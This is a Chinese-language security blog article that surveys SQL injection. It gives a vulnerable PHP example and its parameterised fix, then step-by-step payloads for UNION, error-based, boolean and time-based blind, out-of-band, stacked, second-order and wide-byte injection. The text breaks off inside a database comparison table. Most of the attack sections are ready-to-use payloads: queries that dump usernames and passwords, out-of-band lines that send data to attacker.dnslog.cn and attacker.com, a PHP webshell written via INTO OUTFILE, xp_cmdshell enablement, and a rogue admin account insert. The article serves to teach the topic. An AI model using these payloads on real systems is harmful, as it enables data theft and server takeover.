#  SQL 注入漏洞总结  
x7ovl
                    x7ovl  xsec   2026-02-26 06:20  
  
── 摘要 · ABSTRACT ──  
  
SQL 注入（SQL Injection）是历史最悠久、危害最深远的 Web 安全漏洞之一，连续多年高居 OWASP Top 10 榜单。攻击者通过在用户可控输入中插入恶意 SQL 语句，操控后端数据库执行非预期查询，可导致数据泄露、数据篡改、权限绕过乃至服务器沦陷。本文系统梳理 SQL 注入的全部主流类型、利用技术、WAF 绕过手法与防御实践，构建完整的知识体系。  
  
01  
什么是 SQL 注入  
  
SQL 注入的本质是：**用户可控数据被拼接进 SQL 语句，导致数据与代码的边界被打破**  
。数据库无法区分"合法查询"与"攻击者注入的恶意逻辑"，从而执行了攻击者期望的操作。  
  
❌ 漏洞代码示例（PHP + MySQL）  
  
// ❌ 危险：直接拼接用户输入                                  
  
$username  
 =  
$_GET  
[  
'username'  
];  
  
$sql  
 =  
"SELECT * FROM users WHERE username='"  
.  
$username  
 .  
"'"  
;  
  
// 正常请求：username=admin  
  
// → SELECT * FROM users WHERE username='admin'  
  
// 注入攻击：username=' OR '1'='1  
  
// → SELECT * FROM users WHERE username='' OR '1'='1'  
// → 返回所有用户！  
  
✅ 安全代码示例（预编译参数化查询）  
  
// ✅ 安全：使用预编译语句  
  
$stmt  
 =  
$pdo  
->  
prepare  
(  
"SELECT * FROM users WHERE username = ?"  
);  
  
$stmt  
->  
execute  
([  
$_GET  
[  
'username'  
]]);  
// 无论输入什么，都只会被当作"数据"，永不被执行  
  
SQL 注入可造成的危害：  
<table><tbody><tr style="background:#fff5f5;"><td style="padding: 10px 14px;border: 1px solid rgb(238, 238, 238);font-weight: bold;color: rgb(229, 57, 53);"><section><span leaf="">数据泄露</span></section></td><td style="padding:10px 14px;border:1px solid #eee;color:#555;"><section><span leaf="">读取数据库中所有数据，包括用户密码、个人信息、商业机密</span></section></td></tr><tr><td style="padding:10px 14px;border:1px solid #eee;font-weight:bold;color:#f57c00;"><section><span leaf="">权限绕过</span></section></td><td style="padding:10px 14px;border:1px solid #eee;color:#555;"><section><span leaf="">绕过登录验证，以任意用户（含管理员）身份登录</span></section></td></tr><tr style="background:#f9f9f9;"><td style="padding:10px 14px;border:1px solid #eee;font-weight:bold;color:#f57c00;"><section><span leaf="">数据篡改</span></section></td><td style="padding:10px 14px;border:1px solid #eee;color:#555;"><section><span leaf="">INSERT/UPDATE/DELETE 任意数据，破坏数据完整性</span></section></td></tr><tr><td style="padding:10px 14px;border:1px solid #eee;font-weight:bold;color:#7b5bdb;"><section><span leaf="">文件读写</span></section></td><td style="padding:10px 14px;border:1px solid #eee;color:#555;"><section><span leaf="">利用 LOAD_FILE/INTO OUTFILE 读写服务器文件，写入 WebShell</span></section></td></tr><tr style="background:#f9f9f9;"><td style="padding:10px 14px;border:1px solid #eee;font-weight:bold;color:#e53935;"><section><span leaf="">命令执行</span></section></td><td style="padding:10px 14px;border:1px solid #eee;color:#555;"><section><span leaf="">通过 xp_cmdshell（MSSQL）、UDF 等执行系统命令，完整 RCE</span></section></td></tr></tbody></table>  
02  
注入类型全景图  
  
SQL 注入分类体系  
<table><tbody><tr><td style="padding: 6px 12px;background: rgb(229, 57, 53);color: rgb(255, 255, 255);font-family: monospace;font-size: 10px;letter-spacing: 1px;text-align: center;font-weight: bold;"><section><span leaf="">按回显分</span></section></td><td style="padding:6px 0 6px 16px;border-left:2px solid #e53935;color:#333;"><span style="display:inline-block;background:#ffebee;color:#e53935;border:1px solid #ffcdd2;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">有回显</span></span><span style="display:inline-block;background:#fff8e1;color:#f57c00;border:1px solid #ffe082;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">无回显（盲注）</span></span><span style="display:inline-block;background:#f3e5f5;color:#7b5bdb;border:1px solid #ce93d8;font-family:monospace;font-size:10px;padding:2px 8px;margin-bottom:4px;"><span leaf="">带外（OOB）</span></span></td></tr><tr><td colspan="2" style="height:8px;"><section><span leaf=""><br/></span></section></td></tr><tr><td style="padding:6px 12px;background:#1565c0;color:#fff;font-family:monospace;font-size:10px;letter-spacing:1px;text-align:center;font-weight:bold;"><section><span leaf="">按技术分</span></section></td><td style="padding:6px 0 6px 16px;border-left:2px solid #1565c0;color:#333;"><span style="display:inline-block;background:#e3f2fd;color:#1565c0;border:1px solid #90caf9;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">UNION 联合查询</span></span><span style="display:inline-block;background:#e8f5e9;color:#2e7d32;border:1px solid #a5d6a7;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">报错注入</span></span><span style="display:inline-block;background:#fff8e1;color:#f57c00;border:1px solid #ffe082;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">布尔盲注</span></span><span style="display:inline-block;background:#fce4ec;color:#c62828;border:1px solid #f48fb1;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">时间盲注</span></span><span style="display:inline-block;background:#f3e5f5;color:#6a1b9a;border:1px solid #ce93d8;font-family:monospace;font-size:10px;padding:2px 8px;margin-bottom:4px;"><span leaf="">堆叠注入</span></span></td></tr><tr><td colspan="2" style="height:8px;"><section><span leaf=""><br/></span></section></td></tr><tr><td style="padding:6px 12px;background:#00695c;color:#fff;font-family:monospace;font-size:10px;letter-spacing:1px;text-align:center;font-weight:bold;"><section><span leaf="">按位置分</span></section></td><td style="padding:6px 0 6px 16px;border-left:2px solid #00695c;color:#333;"><span style="display:inline-block;background:#e0f2f1;color:#00695c;border:1px solid #80cbc4;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">GET参数</span></span><span style="display:inline-block;background:#e0f2f1;color:#00695c;border:1px solid #80cbc4;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">POST参数</span></span><span style="display:inline-block;background:#e0f2f1;color:#00695c;border:1px solid #80cbc4;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">HTTP Header</span></span><span style="display:inline-block;background:#e0f2f1;color:#00695c;border:1px solid #80cbc4;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">Cookie</span></span><span style="display:inline-block;background:#e0f2f1;color:#00695c;border:1px solid #80cbc4;font-family:monospace;font-size:10px;padding:2px 8px;margin-bottom:4px;"><span leaf="">JSON/XML</span></span></td></tr><tr><td colspan="2" style="height:8px;"><section><span leaf=""><br/></span></section></td></tr><tr><td style="padding:6px 12px;background:#4e342e;color:#fff;font-family:monospace;font-size:10px;letter-spacing:1px;text-align:center;font-weight:bold;"><section><span leaf="">特殊类型</span></section></td><td style="padding:6px 0 6px 16px;border-left:2px solid #4e342e;color:#333;"><span style="display:inline-block;background:#efebe9;color:#4e342e;border:1px solid #bcaaa4;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">二次注入</span></span><span style="display:inline-block;background:#efebe9;color:#4e342e;border:1px solid #bcaaa4;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">宽字节注入</span></span><span style="display:inline-block;background:#efebe9;color:#4e342e;border:1px solid #bcaaa4;font-family:monospace;font-size:10px;padding:2px 8px;margin-right:6px;margin-bottom:4px;"><span leaf="">ORDER BY注入</span></span><span style="display:inline-block;background:#efebe9;color:#4e342e;border:1px solid #bcaaa4;font-family:monospace;font-size:10px;padding:2px 8px;margin-bottom:4px;"><span leaf="">DNSlog注入</span></span></td></tr></tbody></table>  
  
03  
联合查询注入（UNION-based）  
  
UNION 注入是**最直观、效率最高**  
的注入方式，前提是页面有数据回显。攻击者通过UNION SELECT  
 将额外查询结果"拼接"到正常结果中返回。  
  
//  
 完整利用步骤  
  
STEP 1 · 判断注入点类型  
  
# 数字型注入探测  
  
?id=1   
AND 1=1    
-- 返回正常  
  
?id=1   
AND 1=2    
-- 返回异常 → 存在注入  
  
# 字符型注入探测  
  
?id=1  
'    
-- 报错 → 存在字符型注入  
  
?id=1  
' --+     
-- 正常 → 确认注释有效  
  
STEP 2 · 确定列数（ORDER BY / UNION NULL）  
  
# 方法一：ORDER BY 二分法  
  
?id=1' ORDER BY  
3  
 --+    
-- 正常  
  
?id=1' ORDER BY  
4  
 --+    
-- 报错 → 共 3 列  
  
# 方法二：UNION NULL 探测  
  
?id=1' UNION SELECT NULL,NULL,NULL --+     
-- 3个NULL正常  
  
STEP 3 · 确定回显位置  
  
# 用数字标记找到哪个字段显示在页面上  
  
?id=  
-1  
' UNION SELECT  
'A'  
,  
'B'  
,  
'C'  
 --+    
-- 页面显示 B → 第 2 列为回显位  
  
STEP 4 · 信息收集 → 拖库  
  
# 获取数据库版本、当前库名、用户  
  
?id=-1' UNION SELECT  
version()  
,  
database()  
,  
user()  
 --+  
  
# 获取所有数据库名  
  
?id=-1' UNION SELECT  
group_concat  
(schema_name),2,3  FROM information_schema.schemata --+  
  
# 获取指定库的所有表名  
  
?id=-1' UNION SELECT  
group_concat  
(table_name),2,3  FROM information_schema.tables  WHERE table_schema=  
'security'  
 --+  
  
# 获取表的所有列名  
  
?id=-1' UNION SELECT  
group_concat  
(column_name),2,3  FROM information_schema.columns  WHERE table_name=  
'users'  
 --+  
  
# 最终：dump 数据  
  
?id=-1' UNION SELECT  
group_concat  
(username,  
':'  
,password),2,3  FROM security.users --+  
  
!  
适用条件  
  
UNION 注入要求：① 页面有数据回显；② UNION 前后查询列数相同；③ 对应位置数据类型兼容。无回显场景须改用盲注技术。  
  
04  
报错注入（Error-based）  
  
当页面显示数据库错误信息，但**不直接回显查询结果**  
时，可利用报错注入。其原理是构造特定的函数调用，**让数据库在报错信息中把查询结果带出来**  
。  
<table><thead><tr style="background:#f5f5f5;"><th style="font-family:monospace;font-size:10px;letter-spacing:1.5px;color:#666;text-transform:uppercase;padding:9px 12px;border:1px solid #e0e0e0;text-align:left;"><section><span leaf="">函数</span></section></th><th style="font-family:monospace;font-size:10px;letter-spacing:1.5px;color:#666;text-transform:uppercase;padding:9px 12px;border:1px solid #e0e0e0;text-align:left;"><section><span leaf="">利用原理</span></section></th><th style="font-family:monospace;font-size:10px;letter-spacing:1.5px;color:#666;text-transform:uppercase;padding:9px 12px;border:1px solid #e0e0e0;text-align:left;"><section><span leaf="">数据库</span></section></th></tr></thead><tbody><tr><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#e53935;font-weight:bold;background:#fafafa;"><section><span leaf="">extractvalue()</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;color:#555;"><section><span leaf="">XPath 语法错误，将查询结果嵌入错误信息输出</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#1565c0;"><section><span leaf="">MySQL</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#e53935;font-weight:bold;"><section><span leaf="">updatexml()</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;color:#555;"><section><span leaf="">同上，更新 XML 时 XPath 错误触发，结果长度限制 32 字符</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#1565c0;"><section><span leaf="">MySQL</span></section></td></tr><tr><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#e53935;font-weight:bold;background:#fafafa;"><section><span leaf="">floor(rand()*2)</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;color:#555;"><section><span leaf="">GROUP BY 主键重复错误，将结果嵌入错误信息，无长度限制</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#1565c0;"><section><span leaf="">MySQL</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#7b5bdb;font-weight:bold;"><section><span leaf="">convert()</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;color:#555;"><section><span leaf="">类型转换失败，错误信息中暴露数据值</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#7b5bdb;"><section><span leaf="">MSSQL</span></section></td></tr><tr><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#00875a;font-weight:bold;background:#fafafa;"><section><span leaf="">XMLType()</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;color:#555;"><section><span leaf="">Oracle 特有的 XML 解析错误泄露数据</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#00875a;"><section><span leaf="">Oracle</span></section></td></tr></tbody></table>  
SQL  
MySQL 报错注入常用 Payload  
  
-- 1. extractvalue() 获取当前数据库  
  
' AND  
extractvalue  
(  
1  
,  
concat  
(  
0x7e  
,  
database  
())) --+    
-- 报错：XPATH syntax error: '~security'  
  
-- 2. updatexml() 获取版本信息  
  
' AND  
updatexml  
(  
1  
,  
concat  
(  
0x7e  
,  
version  
()),  
1  
) --+    
  
-- 3. updatexml() 获取表名（超 32 字符用 substr 分页）  
  
'AND  
updatexml  
(  
1  
,  
concat  
(  
0x7e  
,  (  
SELECT  
group_concat  
(table_name)  
FROM  
 information_schema.tables  
WHERE  
 table_schema=  
database  
())),  
1  
) --+  
  
-- 4. floor(rand()*2) 无长度限制版本  
  
'AND(  
SELECT  
1  
FROM  
(  
SELECT COUNT  
(*),  
concat  
(    (  
SELECT  
user  
()),  
floor  
(  
rand  
()  
*  
2  
)) x  
FROM  
 information_schema.tables  
GROUP BY  
 x) a) --+  
  
05  
布尔盲注（Boolean-based Blind）  
  
当页面**没有任何数据回显**  
，但在条件为真/假时返回**不同的页面状态**  
（如有无内容、不同提示文字），即可使用布尔盲注。通过**逐字符二分猜测**  
来还原数据。  
  
SQL  
布尔盲注 Payload 详解  
  
-- 核心思路：用 ASCII + SUBSTR 逐字符二分猜测  
--   
  
Step1：判断数据库名长度  
  
?id=1' AND  
length  
(  
database  
())=  
8  
 --+    
-- 返回正常 → 数据库名长度为 8  
--   
  
Step2：逐字符猜测（二分法）  
  
?id=1' AND  
ascii  
(  
substr  
(  
database  
(),  
1  
,  
1  
))>  
100  
 --+    
-- 正常  
  
?id=1' AND  
ascii  
(  
substr  
(  
database  
(),  
1  
,  
1  
))>  
110  
 --+    
-- 异常  
  
?id=1' AND  
ascii  
(  
substr  
(  
database  
(),  
1  
,  
1  
))=  
115  
 --+    
-- 正常 → 第1位='s'  
--   
  
Step3：猜表名（同理）  
  
?id=1' AND  
ascii  
(  
substr  
(  (  
SELECT  
 table_name  
FROM  
 information_schema.tables  
WHERE  
 table_schema=  
database  
()  
LIMIT  
0  
,  
1  
),  
1  
,  
1  
))=  
101  
 --+    
  
-- 也可以使用 regexp 或 like 替代 ascii+substr  
  
?id=1' AND (  
SELECT  
substr  
(table_name,  
1  
,  
1  
)  
FROM  
 information_schema.tables  
WHERE  
 table_schema=  
database  
()  
LIMIT  
0  
,  
1  
)  REGEXP  
'^e'  
 --+  
  
i  
效率说明  
  
手工布尔盲注效率极低，实战中应配合 SQLMap 的--technique=B  
 参数自动化利用。猜测一个 8 字符的字符串理论上只需约 56 次请求（每字符 7 次二分）。  
  
06  
时间盲注（Time-based Blind）  
  
当页面无论成功或失败都**返回完全相同的响应**  
时，布尔盲注也失效。此时可利用**时间延迟**  
来推断条件是否为真——条件真则延迟，条件假则不延迟。  
<table><thead><tr style="background:#f5f5f5;"><th style="font-family:monospace;font-size:10px;letter-spacing:1.5px;color:#666;text-transform:uppercase;padding:9px 12px;border:1px solid #e0e0e0;text-align:left;"><section><span leaf="">数据库</span></section></th><th style="font-family:monospace;font-size:10px;letter-spacing:1.5px;color:#666;text-transform:uppercase;padding:9px 12px;border:1px solid #e0e0e0;text-align:left;"><section><span leaf="">延迟函数</span></section></th><th style="font-family:monospace;font-size:10px;letter-spacing:1.5px;color:#666;text-transform:uppercase;padding:9px 12px;border:1px solid #e0e0e0;text-align:left;"><section><span leaf="">示例</span></section></th></tr></thead><tbody><tr><td style="padding:9px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#1565c0;background:#fafafa;"><section><span leaf="">MySQL</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#e53935;"><section><span leaf="">sleep(N)</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#555;"><section><span leaf="">IF(1=1, sleep(3), 0)</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:9px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#1565c0;"><section><span leaf="">MySQL</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#e53935;"><section><span leaf="">benchmark(N,expr)</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#555;"><section><span leaf="">benchmark(5000000, md5(1))</span></section></td></tr><tr><td style="padding:9px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#7b5bdb;background:#fafafa;"><section><span leaf="">MSSQL</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#e53935;"><section><span leaf="">WAITFOR DELAY</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#555;"><section><span leaf="">WAITFOR DELAY &#39;0:0:5&#39;</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:9px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#00875a;"><section><span leaf="">PostgreSQL</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#e53935;"><section><span leaf="">pg_sleep(N)</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#555;"><section><span leaf="">SELECT pg_sleep(5)</span></section></td></tr><tr><td style="padding:9px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#f57c00;background:#fafafa;"><section><span leaf="">Oracle</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11.5px;color:#e53935;"><section><span leaf="">dbms_pipe.receive</span></section></td><td style="padding:9px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#555;"><section><span leaf="">dbms_pipe.receive_message(&#39;a&#39;,5)</span></section></td></tr></tbody></table>  
SQL  
MySQL 时间盲注完整示例  
  
-- 基础验证：条件为真时延迟 5 秒  
  
?id=1' AND  
IF  
(  
1  
=  
1  
,  
sleep  
(  
5  
),  
0  
) --+  
  
-- 猜测数据库名第一个字母 ASCII > 100？  
  
?id=1' AND  
IF  
(  
ascii  
(  
substr  
(  
database  
(),  
1  
,  
1  
))>  
100  
,  
sleep  
(  
5  
),  
0  
) --+  
  
-- 响应时间 ≥5s → 条件真；<1s → 条件假  
-- 提取表名（逐字符时间盲注）  
  
?id=1' AND  
IF  
(  
ascii  
(  
substr  
(    (  
SELECT  
 table_name  
FROM  
 information_schema.tables  
WHERE  
 table_schema=  
database  
()  
LIMIT  
0  
,  
1  
),  
1  
,  
1  
))=  
117  
,  
sleep  
(  
3  
),  
0  
) --+  
  
-- 延迟 → 首字母 ASCII=117 即 'u'  
  
07  
带外注入（OOB）与堆叠注入  
  
//  
 带外注入（Out-of-Band）  
  
当时间盲注因网络不稳定（延迟波动大）而难以准确判断时，带外注入通过**让数据库主动向攻击者服务器发起 DNS 或 HTTP 请求**  
，将查询结果附在请求中带出，更为可靠。  
  
SQL  
OOB 注入 Payload（需数据库高权限）  
  
-- MySQL：利用 load_file + UNC 路径（Windows 环境）  
  
'AND  
load_file  
(  
concat  
(  
'\\\\'  
,  
database  
(),  
'.attacker.dnslog.cn\\'  
,  
'a'  
)) --+  
  
-- DNS 请求：security.attacker.dnslog.cn → 数据库名泄露  
-- Oracle：利用 UTL_HTTP 发起 HTTP 请求带出数据  
  
'||UTL_HTTP.request(  
'http://attacker.com/?d='  
|| (  
SELECT  
user  
FROM  
 dual  )) --  
  
-- MSSQL：利用 master..xp_dirtree 发起 DNS 请求  
  
'; EXEC master..xp_dirtree  
'\\'  
 + (  
SELECT  
TOP  
1  
 name  
FROM  
 sys.databases)  +  
'.attacker.dnslog.cn\a'  
 --  
  
//  
 堆叠注入（Stacked Queries）  
  
通过分号;  
 同时执行多条 SQL 语句，可执行 INSERT/UPDATE/DROP 等写操作，危害极大。**MySQL + PHP PDO、MSSQL、PostgreSQL 均支持**  
；原生 MySQL API 默认不支持。  
  
SQL  
堆叠注入 Payload  
  
-- MySQL 写 WebShell（需 FILE 权限）  
  
';  
SELECT  
'<?php@eval($_POST[cmd])?>'  
INTO OUTFILE  
'/var/www/html/shell.php'  
 --+    
  
-- MSSQL 开启 xp_cmdshell 执行系统命令  
  
'; EXEC sp_configure  
'show advanced options'  
,  
1  
; RECONFIGURE;   EXEC sp_configure  
'xp_cmdshell'  
,  
1  
; RECONFIGURE; --'; EXEC xp_cmdshell  
'whoami'  
   
  
--  
-- 添加管理员账户  
  
';  
INSERT INTO  
 users(username,password)  
VALUES  
(  
'hacker'  
,  
md5('hack123')  
) --+  
  
08  
二次注入 & 宽字节注入  
  
//  
 二次注入（Second-Order Injection）  
  
攻击者将恶意数据**先存入数据库**  
（此时经过了转义，看似安全），之后当系统**从数据库读取该数据并再次拼接进 SQL 语句**  
时，恶意数据不再被转义，触发注入。典型场景：注册用户名admin'--  
，在修改密码功能中触发。  
  
二次注入流程  
<table><tbody><tr><td style="text-align: center;padding: 0px 4px;"><section style="background:#fff;border:1px solid #e0e0e0;padding:10px 6px;font-size:12px;color:#333;text-align:center;"><p style="font-family:monospace;font-size:18px;color:#e53935;margin:0 0 4px;"><span leaf="">1</span></p><p style="margin:0;font-size:12px;"><span leaf="">注册用户名</span><span leaf=""><br/></span><code style="font-family:monospace;font-size:10px;background:#f5f5f5;padding:1px 4px;"><span leaf="">admin&#39;--</span></code></p></section></td><td style="text-align:center;padding:0 2px;font-size:18px;color:#ccc;"><section><span leaf="">→</span></section></td><td style="text-align: center;padding: 0px 4px;"><section style="background:#fff;border:1px solid #e0e0e0;padding:10px 6px;font-size:12px;color:#333;text-align:center;"><p style="font-family:monospace;font-size:18px;color:#f57c00;margin:0 0 4px;"><span leaf="">2</span></p><p style="margin:0;font-size:12px;"><span leaf="">转义后存入</span><span leaf=""><br/></span><span leaf="">DB：</span><code style="font-family:monospace;font-size:10px;background:#f5f5f5;padding:1px 4px;"><span leaf="">admin\&#39;--</span></code></p></section></td><td style="text-align:center;padding:0 2px;font-size:18px;color:#ccc;"><section><span leaf="">→</span></section></td><td style="text-align: center;padding: 0px 4px;"><section style="background:#fff;border:1px solid #e0e0e0;padding:10px 6px;font-size:12px;color:#333;text-align:center;"><p style="font-family:monospace;font-size:18px;color:#1565c0;margin:0 0 4px;"><span leaf="">3</span></p><p style="margin:0;font-size:12px;"><span leaf="">读取时还原</span><span leaf=""><br/></span><span leaf="">为</span><code style="font-family:monospace;font-size:10px;background:#f5f5f5;padding:1px 4px;"><span leaf="">admin&#39;--</span></code></p></section></td><td style="text-align:center;padding:0 2px;font-size:18px;color:#ccc;"><section><span leaf="">→</span></section></td><td style="text-align: center;padding: 0px 4px;"><section style="background:#fff5f5;border:1px solid #ffcdd2;padding:10px 6px;font-size:12px;color:#e53935;text-align:center;"><p style="font-family:monospace;font-size:18px;color:#e53935;margin:0 0 4px;"><span leaf="">💥</span></p><p style="margin:0;font-size:12px;"><span leaf="">二次拼接</span><span leaf=""><br/></span><span leaf="">注入触发！</span></p></section></td></tr></tbody></table>  
  
//  
 宽字节注入（Wide-byte Injection）  
  
在 GBK 等宽字节编码下，当程序使用addslashes()  
 将'  
 转义为\'  
（即0x27  
 →0x5c27  
），攻击者在'  
 前加入%df，使%df%5c 被 GBK 解析为一个汉字（縗），从而吃掉反斜杠，使引号逃逸。  
  
PAYLOAD  
宽字节注入示例（GBK编码）  
  
# 原始 Payload  
  
?id=1  
%df'  
 UNION SELECT 1,2,3 --+  
  
# 处理过程：  
  
# 输入：      0xdf 0x27  
# addslashes：0xdf 0x5c 0x27  (加入反斜杠)  
  
# GBK解码：   0xdf5c=縗 + 0x27='  
# 反斜杠被吃掉，引号成功逃逸！  
  
# 防御：使用 mysql_set_charset('utf8') 或 PDO  
  
09  
不同数据库的注入差异  
<table><thead><tr style="background:#1a1a2e;color:#fff;"><th style="padding:10px 12px;border:1px solid #333;text-align:left;font-family:monospace;font-size:10px;letter-spacing:1.5px;text-transform:uppercase;"><section><span leaf="">特性</span></section></th><th style="padding:10px 12px;border:1px solid #333;text-align:center;font-family:monospace;font-size:10px;letter-spacing:1px;color:#00c8f0;"><section><span leaf="">MySQL</span></section></th><th style="padding:10px 12px;border:1px solid #333;text-align:center;font-family:monospace;font-size:10px;letter-spacing:1px;color:#7b5bdb;"><section><span leaf="">MSSQL</span></section></th><th style="padding:10px 12px;border:1px solid #333;text-align:center;font-family:monospace;font-size:10px;letter-spacing:1px;color:#e53935;"><section><span leaf="">Oracle</span></section></th><th style="padding:10px 12px;border:1px solid #333;text-align:center;font-family:monospace;font-size:10px;letter-spacing:1px;color:#3dffa0;"><section><span leaf="">PostgreSQL</span></section></th></tr></thead><tbody><tr><td style="padding:8px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#555;background:#fafafa;"><section><span leaf="">注释符</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">-- / #</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">--</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">--</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">--</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:8px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#555;"><section><span leaf="">字符串拼接</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">concat(a,b)</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">a+b</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">a||b</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">a||b</span></section></td></tr><tr><td style="padding:8px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#555;background:#fafafa;"><section><span leaf="">获取当前库</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">database()</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">db_name()</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">ora_database_name</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">current_database()</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:8px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#555;"><section><span leaf="">获取版本</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">version()</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">@@version</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">v$version</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">version()</span></section></td></tr><tr><td style="padding:8px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#555;background:#fafafa;"><section><span leaf="">系统表</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">information_schema</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">sysobjects</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">all_tables</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">information_schema</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:8px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#555;"><section><span leaf="">延迟函数</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">sleep(N)</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">WAITFOR DELAY</span></section></td><td style="padding:8px 12px;border:1px solid 